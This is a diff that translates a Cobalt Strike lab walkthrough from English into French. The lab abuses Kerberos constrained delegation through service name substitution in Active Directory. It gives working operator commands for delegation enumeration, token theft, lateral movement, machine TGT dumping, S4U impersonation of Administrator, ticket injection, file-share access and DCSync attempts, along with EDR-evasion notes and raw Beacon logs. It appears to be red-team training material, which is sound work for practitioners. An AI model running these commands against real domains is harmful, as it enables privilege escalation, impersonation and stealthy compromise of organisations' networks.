@@ -1,43 +1,43 @@
-# Constrained Delegation with Service Name Substitution Kerberos Lab
+# Lab — Constrained Delegation avec Service Name Substitution
 
->The objective of this lab is to abuse constrained delegation using an alternate service name.
+> L’objectif est d’exploiter la **Constrained Delegation** en utilisant un autre nom de service.
 
-**Concept:** When constrained delegation is configured for a non-CIFS service (e.g. `time/lon-fs-1`), a service ticket for that SPN can have its service class swapped in the unencrypted portion of the ticket (e.g. `time` → `cifs`). The target server only validates the encrypted portion — it never checks the SPN in the unencrypted PAC — so the substituted ticket is accepted. This turns a restricted delegation into full file system access without needing CIFS in `msDS-AllowedToDelegateTo`.
+**Principe :** lorsqu’une Constrained Delegation vise un service non-CIFS (par exemple `time/lon-fs-1`), le scénario remplace la classe de service dans la partie non chiffrée du ticket (`time` → `cifs`). Selon ces notes, la cible valide la partie chiffrée et accepte le ticket modifié. Cela permet d’accéder au filesystem même si CIFS n’apparaît pas dans `msDS-AllowedToDelegateTo`.
 
 ===
 
-## Enumeration
+## Énumération
 
-1. Launch Cobalt Strike and connect to the team server.
-2. Find constrained delegation targets — note the value in `msDS-AllowedToDelegateTo` (e.g. `time/lon-fs-1`). You will need the exact SPN in the exploitation step.  
+1. Lancer Cobalt Strike et se connecter au team server.
+2. Rechercher les cibles de Constrained Delegation et relever la valeur de `msDS-AllowedToDelegateTo` (par exemple `time/lon-fs-1`). Le SPN exact est nécessaire pour l’étape suivante.  
 
 ```Beacon-nocolor
 ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
 ```
 
-> OPSEC-🟢SAFE — BOF, runs in beacon thread, no child process.
+> OPSEC-🟢SAFE — BOF exécuté dans le thread Beacon, sans child process.
 
-⚠️ Expected output: `lon-ws-1$` with `msDS-AllowedToDelegateTo: time/lon-fs-1`. The service is `time`, not `cifs` — that is the point of this lab.
+⚠️ Résultat attendu : `lon-ws-1$` avec `msDS-AllowedToDelegateTo: time/lon-fs-1`. Le service est `time`, et non `cifs` : c’est le point étudié dans ce lab.
 
-## Lateral Movement to lon-ws-1
+## Lateral Movement vers lon-ws-1
 
-Goal: get a beacon running as SYSTEM on `lon-ws-1` so we can access the machine account logon session (LUID `0x3e7`) and dump its TGT.
+Objectif : disposer d’un Beacon SYSTEM sur `lon-ws-1` afin d’accéder à la session de logon du compte machine (LUID `0x3e7`) et d’en récupérer le TGT.
 
-1. Find a process owned by `rsteel` (Workstation Admin on lon-ws-1):
+1. Rechercher un processus appartenant à `rsteel` (Workstation Admin sur lon-ws-1) :
 
 ```cs
 ps
 // Look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
 ```
 
-2. Steal the token:
+2. Récupérer le token :
 
 ```cs
 steal_token <rsteel-pid>    // OPSEC-🟢SAFE — no logon event, no child process
 getuid                       // confirm CONTOSO\rsteel
 ```
 
-3. Set spawnto before jumping:
+3. Configurer `spawnto` avant le Jump :
 
 ```cs
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
@@ -46,7 +46,7 @@ ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 spawnto x64 %windir%\sysnative\dllhost.exe
 ```
 
-4. Jump to lon-ws-1
+4. Effectuer un Jump vers lon-ws-1
 
 ```cs
 jump scshell64 lon-ws-1 smb
@@ -54,7 +54,7 @@ jump scshell64 lon-ws-1 smb
 rev2self    // drop rsteel token on source beacon after jump succeeds
 ```
 
-5. On the new lon-ws-1 beacon — verify SYSTEM context:
+5. Depuis le nouveau Beacon de lon-ws-1, vérifier le contexte SYSTEM :
 
 ```cs
 getuid
@@ -63,65 +63,65 @@ getuid
 
 ## Exploitation
 
-### Step 1 — Dump the machine account TGT
+### Étape 1 — Récupérer le TGT du compte machine
 
-LUID `0x3e7` is the machine account logon session — always present on any domain-joined host, always SYSTEM-accessible.
+Le LUID `0x3e7` désigne la session de logon du compte machine sur un hôte joint au domaine, accessible depuis SYSTEM selon les notes.
 
 ```cs
 krb_dump /luid:3e7 /service:krbtgt
 ```
 
-> OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API — not a raw LSASS memory read, but EDR hooks on this API will still fire.
+> OPSEC-🟠CAUTION — BOF utilisant l’API Kerberos `LsaCallAuthenticationPackage`, sans lecture directe de LSASS. Un EDR peut observer cet appel API.
 
-> ⚠️ **Lab-confirmed (2026-04-19):** Use `/luid:3e7` — do NOT prefix with `0x`. Kerbeus-BOF rejects `/luid:0x3e7` and returns `[x] Invalid luid`.
+> ⚠️ **Vérifié dans le lab (19/04/2026) :** utiliser `/luid:3e7` sans le préfixe `0x`. Kerbeus-BOF rejette `/luid:0x3e7` avec `[x] Invalid luid`.
 
-⚠️ Copy the entire base64 TGT blob — pass it to `krb_s4u` next.
+⚠️ Copier l’intégralité du TGT Base64 pour l’utiliser ensuite avec `krb_s4u`.
 
 > ```cs
 > beacon> krb_dump /user:Administrator /service:krbtgt
 > ```
-> Lab confirmed (2026-04-19): Administrator TGT was cached on lon-ws-1 at LUID `0x7940d`. Direct DA path — no delegation abuse required.
+> Résultat observé dans le lab (19/04/2026) : le TGT Administrator était en cache sur lon-ws-1 au LUID `0x7940d`. Un accès Domain Admin direct était donc possible sans exploiter la delegation.
 
->Verify ticket before using:  
+> Vérifier le ticket avant de l’utiliser :  
 
 ```cs
 beacon> krb_describe /ticket:[base64-TGT]    // OPSEC-🟢SAFE — BOF, read-only
 ```
 
 
-### Step 2 — S4U abuse with service name substitution
+### Étape 2 — S4U avec Service Name Substitution
 
-Use the machine TGT to request a service ticket for the delegated SPN (`time/lon-fs-1`), then substitute the service class to `cifs`. The resulting ticket is valid for `cifs/lon-fs-1` impersonating Administrator.
+Utiliser le TGT machine pour demander un service ticket pour le SPN délégué (`time/lon-fs-1`), puis remplacer la classe de service par `cifs`. Le ticket obtenu est destiné à `cifs/lon-fs-1` avec impersonation d’Administrator.
 
 ```Beacon-nocolor
 krb_s4u /ticket:[base64-TGT-output-from-krb_dump_3e7] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
 ```
 
-> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.
+> OPSEC-🟢SAFE — `krb_s4u` est un BOF exécuté dans le thread Beacon, sans child process ni écriture sur disque.
 
-⚠️ `/service:time/lon-fs-1` must exactly match the value in `msDS-AllowedToDelegateTo` from enumeration — if the delegation target is different in your lab, substitute accordingly.
+⚠️ `/service:time/lon-fs-1` doit correspondre exactement à `msDS-AllowedToDelegateTo`. Adapter la valeur si le SPN cible diffère dans le lab.
 
-⚠️ `/altservice:cifs` replaces the service class in the unencrypted ticket header. The KDC-signed encrypted portion is unchanged — the target host accepts it.
+⚠️ `/altservice:cifs` modifie la classe de service dans le header non chiffré du ticket. La partie chiffrée signée par le KDC reste inchangée dans ce scénario.
 
-⚠️ `krb_s4u` outputs a base64-encoded service ticket. Copy the full base64 string from the beacon output — you need it in Step 3.
+⚠️ `krb_s4u` renvoie un service ticket en Base64. Copier sa valeur complète pour l’étape 3.
 
 ---
 
-### Step 3 — Save the service ticket on the attacker machine
+### Étape 3 — Enregistrer le service ticket sur l’Attacker Desktop
 
->Run this on the attacker CS client (local PowerShell — **not** via beacon):
+> Exécuter cette commande sur le client Cobalt Strike de l’Attacker Desktop (PowerShell local, **pas** via le Beacon) :
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET_output_from_KRB_s4u_beacon]"))
 ```
 
-> The `.kirbi` file is written to your **attacker desktop only** — nothing touches the target's disk. `kerberos_ticket_use` reads from the CS client and injects over the C2 channel.
+> Le fichier `.kirbi` reste sur **l’Attacker Desktop** et n’est pas écrit sur la cible. `kerberos_ticket_use` lit le fichier depuis le client CS et l’injecte par le canal C2.
 
 ---
 
-### Step 4 — Inject the ticket and access the share
+### Étape 4 — Injecter le ticket et accéder au partage
 
-Back in the beacon on `lon-ws-1`:
+De retour dans le Beacon de `lon-ws-1` :
 
 ```cs
 // make_token is OPTIONAL when beacon is SYSTEM — lab-confirmed (2026-04-19)
@@ -140,15 +140,15 @@ kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
 ls \\lon-fs-1\c$
 ```
 
-> **Why Option A works:** The injected `cifs/lon-fs-1` service ticket is presented to lon-fs-1 during the network auth. The remote server only validates the Kerberos ticket — it never checks what the local logon session identity is. SYSTEM context is sufficient to hold and present the injected ticket.
+> **Pourquoi l’option A fonctionne :** le service ticket `cifs/lon-fs-1` injecté est présenté pendant l’authentification réseau. Le serveur distant valide le ticket Kerberos ; le contexte SYSTEM peut le conserver et le présenter dans ce lab.
 
-⚠️ If `ls \\lon-fs-1\c$` returns `ACCESS_DENIED`:
-- `krb_triage` — confirm `cifs/lon-fs-1` ticket is present in current session
-- Verify SPN in `krb_s4u` exactly matches `msDS-AllowedToDelegateTo` from ldapsearch
-- Check ticket expiry with `krb_describe /ticket:[base64]`
+⚠️ Si `ls \\lon-fs-1\c$` renvoie `ACCESS_DENIED` :
+- `krb_triage` — vérifier la présence du ticket `cifs/lon-fs-1` dans la session courante.
+- Vérifier que le SPN de `krb_s4u` correspond exactement à `msDS-AllowedToDelegateTo` obtenu avec ldapsearch.
+- Vérifier l’expiration avec `krb_describe /ticket:[base64]`.
 
 
->Raw Beacon log commands and output:  
+> Commandes et sortie brutes du journal Beacon :  
 
 ```
 [05/22 08:38:15] beacon> ls \\lon-fs-1\c$\users
@@ -209,9 +209,9 @@ Service path was restored to "C:\Windows\system32\svchost.exe -k defragsvc"
 
 ```
 
-## LON-FS-1 Enumeration
+## Énumération de LON-FS-1
 
->Raw Beacon log commands and output:  
+> Commandes et sortie brutes du journal Beacon :  
 
 ```
 [05/22 08:40:25] [+] established link to parent beacon: 10.10.120.10
@@ -267,9 +267,9 @@ Action: List Kerberos Tickets (All Users)
 ```
 
 
-## Lateral Movement to LON-DC-1 (INCOMPLETE...)
+## Lateral Movement vers LON-DC-1 (incomplet)
 
-**Step 1 — Check for a DA process to steal (fastest path)**
+**Étape 1 — Vérifier la présence d’un processus Domain Admin**
 
 ```cs
 ps
@@ -280,15 +280,15 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
 
-**Step 2 — If no DA process, dump machine TGT + S4U to DC**
+**Étape 2 — En l’absence de processus DA, récupérer le TGT machine et utiliser S4U vers le DC**
 
-First confirm lon-fs-1 has constrained delegation configured to lon-dc-1:
+Vérifier d’abord si lon-fs-1 dispose d’une Constrained Delegation vers lon-dc-1 :
 
 ```cs
 ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
 ```
 
-If delegation to lon-dc-1 is present, dump the machine TGT and request a CIFS ticket impersonating Administrator:
+Si la delegation vers lon-dc-1 est présente, récupérer le TGT machine et demander un ticket CIFS avec impersonation d’Administrator :
 
 ```cs
 krb_dump /luid:3e7 /service:krbtgt
@@ -297,7 +297,7 @@ krb_dump /luid:3e7 /service:krbtgt
 krb_s4u /ticket:[BASE64-TGT] /service:cifs/lon-dc-1 /impersonateuser:Administrator
 ```
 
-Save and inject the service ticket on attacker desktop:
+Enregistrer et injecter le service ticket depuis l’Attacker Desktop :
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
@@ -309,13 +309,13 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
 
-**Step 3 — If no delegation config, attempt DCSync (requires replication rights)**
+**Étape 3 — Sans configuration de delegation, tester DCSync (droits de réplication requis)**
 
 ```cs
 dcsync contoso.com CONTOSO\krbtgt
 ```
 
-**New beacon OPSEC on LON-DC-1 (run immediately after connect)**
+**Contrôles OPSEC du nouveau Beacon LON-DC-1 (après connexion)**
 
 ```cs
 sleep 5 21
@@ -326,34 +326,34 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 getuid
 ```
 
-### Lab-Confirmed Results — 2026-05-22
+### Résultats observés dans le lab — 22/05/2026
 
-**Step 1 result:** `ps` on LON-FS-1 showed only SYSTEM processes — no DA user session present. `steal_token` path not available.
+**Résultat de l’étape 1 :** `ps` sur LON-FS-1 ne montrait que des processus SYSTEM, sans session Domain Admin. La méthode `steal_token` n’était pas disponible.
 
-**Step 2 result — S4U2proxy FAILED (Kerberos error 13)**
+**Résultat de l’étape 2 — Échec S4U2proxy (Kerberos error 13)**
 
-S4U2self succeeded (self-ticket for Administrator to `LON-FS-1$` obtained), but S4U2proxy returned `[x] Kerberos error : 13` (`KDC_ERR_BADOPTION`). LON-FS-1 has no `msDS-AllowedToDelegateTo` entry for `cifs/lon-dc-1` — the KDC rejected the proxy request. The machine account CIFS tickets visible in `krb_triage` at LUID `0x3e7` and `0x3e4` are normal AD operational tickets, NOT a delegation path.
+S4U2self a fonctionné (self-ticket Administrator vers `LON-FS-1$`), mais S4U2proxy a renvoyé `[x] Kerberos error : 13` (`KDC_ERR_BADOPTION`). LON-FS-1 ne dispose pas de `msDS-AllowedToDelegateTo` pour `cifs/lon-dc-1` : le KDC rejette donc la requête. Les tickets CIFS du compte machine visibles avec `krb_triage` aux LUID `0x3e7` et `0x3e4` correspondent à des opérations AD normales, pas à des permissions de delegation.
 
 ```
 [*] Building S4U2proxy request for service: 'cifs/lon-dc-1'
     [x] Kerberos error : 13
 ```
 
-⚠️ **Key lesson:** Seeing `cifs/lon-dc-1` cached in `krb_triage` does NOT mean S4U2proxy will work — those are machine-initiated service tickets from normal AD operations, not delegation grants. Always confirm delegation config with `ldapsearch` before attempting S4U.
+⚠️ **À retenir :** la présence de `cifs/lon-dc-1` dans `krb_triage` ne prouve pas que S4U2proxy fonctionnera. Ce sont des tickets de service AD ordinaires et non des permissions de delegation. Vérifier la configuration avec `ldapsearch` avant S4U.
 
-**Step 3 result — DCSync FAILED (access denied)**
+**Résultat de l’étape 3 — Échec DCSync (access denied)**
 
 ```
 ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
 ```
 
-`0x20f7 = ERROR_DS_DRA_ACCESS_DENIED` — SYSTEM on a file server has no replication privileges. DCSync requires DA, Domain Controllers group, or explicit replication ACL on the domain NC head.
+`0x20f7 = ERROR_DS_DRA_ACCESS_DENIED` — SYSTEM sur un serveur de fichiers ne dispose pas automatiquement des droits de réplication. DCSync requiert un Domain Admin, un compte du groupe Domain Controllers ou des ACL explicites de réplication sur le domaine.
 
-**Conclusion:** LON-FS-1 is a dead end for reaching LON-DC-1 directly. In the full kill chain the DC is reached via Golden Ticket from other-DC-1 after completing the Dublin domain path — not laterally from FS-1.
+**Conclusion :** dans ce scénario, LON-FS-1 ne permet pas d’atteindre directement LON-DC-1. La Kill Chain complète utilise un Golden Ticket depuis other-DC-1 après le parcours du domaine Dublin, et non un Lateral Movement direct depuis FS-1.
 
 ---
 
-## Cleanup  
+## Cleanup — Restauration  
 
 ```cs
 beacon> rev2self
@@ -362,4 +362,4 @@ beacon> kerberos_ticket_purge    // purge injected ticket from SYSTEM session
 
 ===
 
-⚠️ In this lab, you abused constrained delegation with service name substitution — taking a delegation configured only for `time/lon-fs-1` and turning it into a usable `cifs/lon-fs-1` ticket impersonating a Domain Admin, without ever touching LSASS directly or requiring the Administrator's credentials.
+⚠️ Ce lab présente la **Service Name Substitution** appliquée à une Constrained Delegation configurée pour `time/lon-fs-1`, afin d’obtenir un ticket `cifs/lon-fs-1` avec impersonation Domain Admin, sans credentials Administrator en clair.
